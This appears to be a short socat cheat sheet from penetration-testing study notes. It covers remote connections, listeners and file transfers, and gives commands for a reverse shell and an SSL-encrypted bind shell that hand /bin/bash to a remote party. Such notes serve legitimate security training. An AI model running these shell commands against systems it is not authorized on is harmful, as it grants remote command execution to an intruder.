Connect to a remote server using socat -> socat - TCP4:<remoteIP>:80

Socat start a listener -> socat - TCP4-LISTEN:443 STDOUT


File Transfers using socat
	1) On sending side -> socat - TCP4-LISTEN:443,fork file:<filename>
	2) On receiving end -> socat TCP4:<remoteIP>:443 file:<filename-tobe-saved>,create


Reverse Shells with socat
	1) On listener side -> socat -d -d TCP4-LISTEN:443 STDOUT
	2) On client side -> socat TCP4:<ListenerIP>:443 EXEC:/bin/bash
	
	
	
Encrypted Bind Shells
	1) On Listener side -> create a ssl certificate first -> openssl req -newkey rsa:2048 -nodes -keyout key.key -x509 -days 362 -out cert.crt
		a. Combine for a .pem cert -> cat key.key cert.crt > cert.pem 
		b. -> socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash
	2) On client side: socat - OPENSSL:<ListenerIP>:443,verify=0
